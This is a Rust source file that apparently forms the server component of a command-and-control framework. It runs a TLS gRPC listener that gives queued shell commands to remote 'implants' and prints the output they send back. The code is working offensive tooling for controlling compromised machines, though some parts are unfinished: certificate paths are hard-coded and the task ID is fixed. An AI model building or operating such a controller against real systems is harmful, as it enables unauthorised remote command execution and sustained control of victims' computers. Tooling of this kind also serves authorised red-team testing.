mod implantpb {
    tonic::include_proto!("implantpb");
}

use crate::share::Error;
use implantpb::{ExecBody, Empty, TaskRequest, TaskResponse, TaskResult};
use implantpb::implant_rpc_server::{ImplantRpc, ImplantRpcServer};
use implantpb::task_response::TaskPayload;
use std::net::SocketAddr;
use std::sync::{Mutex, Arc};
use tonic::transport::{Identity, Server, ServerTlsConfig};
use tonic::{Request, Response, Status};

// Listen for implants
pub struct Listener {
    addr: SocketAddr,
    pub tasks: Arc<Mutex<Vec<String>>>
}

impl Listener {
    pub fn new(addr: SocketAddr) -> Listener {
        let tasks = Arc::new(Mutex::new(Vec::new()));
        Listener{
            addr,
            tasks
        }
    }

    // Start an https listener
    // TODO: Auto generate certs instead of using hard-coded certs
    pub fn start_listener(&self) -> Result<(), Error> {
        let cert = std::fs::read("certs/server.pem")
            .map_err(|e| Error::ListenerStartErr(e.to_string()))?;
        let key = std::fs::read("certs/server.key")
            .map_err(|e| Error::ListenerStartErr(e.to_string()))?;
        let identity =  Identity::from_pem(cert, key);

        let service = ImplantService::new(Arc::clone(&self.tasks));
        let tls_config = ServerTlsConfig::new().identity(identity);
        let svc = ImplantRpcServer::new(service);

        let server = Server::builder()
            .tls_config(tls_config)
            .map_err(|e| Error::ListenerStartErr(e.to_string()))?
            .add_service(svc)
            .serve(self.addr);

        tokio::spawn(async move {
            server.await
        });

        Ok(())
    }
}

// Define gRPC methods
struct ImplantService {
    // A thread-save vector of tasks
    tasks: Arc<Mutex<Vec<String>>>
}

impl ImplantService {
    fn new(tasks: Arc<Mutex<Vec<String>>>) -> ImplantService {
        ImplantService { tasks }
    }
}

// Implement the protobuf services
#[tonic::async_trait]
impl ImplantRpc for ImplantService {

    // Let an implant retrieve a task
    async fn get_task(&self, _: Request<TaskRequest>) -> Result<Response<TaskResponse>, Status> {
        let task_payload = match self.tasks.lock() {
            Ok(t) => t,
            Err(_) => return Err(Status::unavailable("Could not lock tasks mutex"))
        }
        .get(0)
        .cloned()
        .map(|cmd| TaskPayload::ExecTask(ExecBody {
            cmd
        }));

        let response = TaskResponse {
            task_id: 1,
            task_type: 2,
            task_payload
        };

        Ok(Response::new(response))
    }

    // Let an implant return the results to the server
    async fn post_result(&self, request: Request<TaskResult>) -> Result<Response<Empty>, Status> {
        let task_result = request.into_inner();
        if let Ok(stdout) = std::str::from_utf8(&task_result.stdout) {
            println!("{}", stdout);
        }
        if let Ok(stderr) = std::str::from_utf8(&task_result.stderr) {
            println!("{}", stderr);
        }
        Ok(Response::new(Empty {}))
    }
}
